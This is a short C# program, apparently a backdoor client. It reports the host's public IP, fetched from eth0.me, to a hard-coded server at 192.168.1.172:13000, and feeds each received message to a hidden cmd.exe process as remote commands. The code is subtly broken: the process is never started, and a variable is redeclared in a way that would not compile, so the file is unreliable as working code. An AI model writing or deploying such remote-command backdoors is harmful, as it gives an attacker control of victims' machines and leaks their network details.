using System;
using System.Net;
using System.Diagnostics;
using System.Net.Sockets;
using System.Net.Http;
using System.Threading.Tasks;

namespace TCPClient
{
    internal class Program
    {
        static async Task Main(string[] args)
        {
            // Initialisation
            string ip = await GetIp();
            int port = 13000;
            bool finished = false;

            // Get the IP adress and while the cliend hasn't been able to send bytes, continue
            IPAddress server = IPAddress.Parse("192.168.1.172");
            while (!finished)
                finished = HandleTcp(server, port, ip);
            Environment.Exit(0);
        }

        /**
         * Get the message, handle it and send the client IP
         */
        static bool HandleTcp(IPAddress server, int port, string ip)
        {
            try
            {
                // Initialisation
                TcpClient client = new TcpClient(server.ToString(), port);
                byte[] bytes = new byte[256];

                NetworkStream stream = client.GetStream();
                string message = string.Empty;

                while (stream.Read(bytes, 0, bytes.Length) != 0)
                {
                    message = System.Text.Encoding.ASCII.GetString(bytes);

                    Process process = new Process();
                    process.StartInfo.FileName = "cmd.exe";
                    process.StartInfo.Arguments = message;
                    process.StartInfo.CreateNoWindow = true;

                    byte[] response = System.Text.Encoding.ASCII.GetBytes(ip);
                    stream.Write(response, 0, response.Length);
                }
                return true;
            }
            catch (Exception e)
            {
                Console.Error.WriteLine(e.Message);
                return false;
            }
        }

        private static async Task<string> GetIp()
        {
            string ip = null;
            try
            {
                // Get response as HttpResponseMessage
                HttpClient httpClient = new HttpClient();
                HttpResponseMessage response = await httpClient.GetAsync("https://eth0.me");

                // Convert HttpResponseMessage into a string
                response.EnsureSuccessStatusCode();
                string ip = await response.Content.ReadAsStringAsync();
            }
            catch(Exception e)
            {
                Console.Error.WriteLine("Error while fetching IP: " + e.Message);
            }

            return ip;
        }
    }
}